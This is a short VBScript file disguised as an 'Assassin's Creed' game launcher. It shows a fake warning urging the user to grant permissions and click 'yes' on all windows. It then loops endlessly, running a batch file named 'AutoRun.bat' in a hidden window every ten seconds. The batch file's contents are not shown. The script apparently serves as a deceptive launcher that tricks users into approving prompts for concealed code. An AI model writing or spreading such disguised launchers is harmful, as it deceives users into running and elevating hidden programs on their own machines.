x=msgbox("MAKE SURE TO ALLOW THE GAME THE NECESSARY PERMISSIONS FOR IT TO RUN. IF IT DOESNT RUN, CLICK YES ON ALL WINDOWS",0,"ASSASSIN'S CREED::WARNING BEFORE PLAYING")

WScript.Sleep 1000

Do
    Set WshShell = CreateObject("WScript.Shell")
    WshShell.Run chr(34) & "AutoRun.bat" & Chr(34), 0
    Set WshShell = Nothing

    WScript.Sleep 10000 ' Sleep for 10 secs
Loop
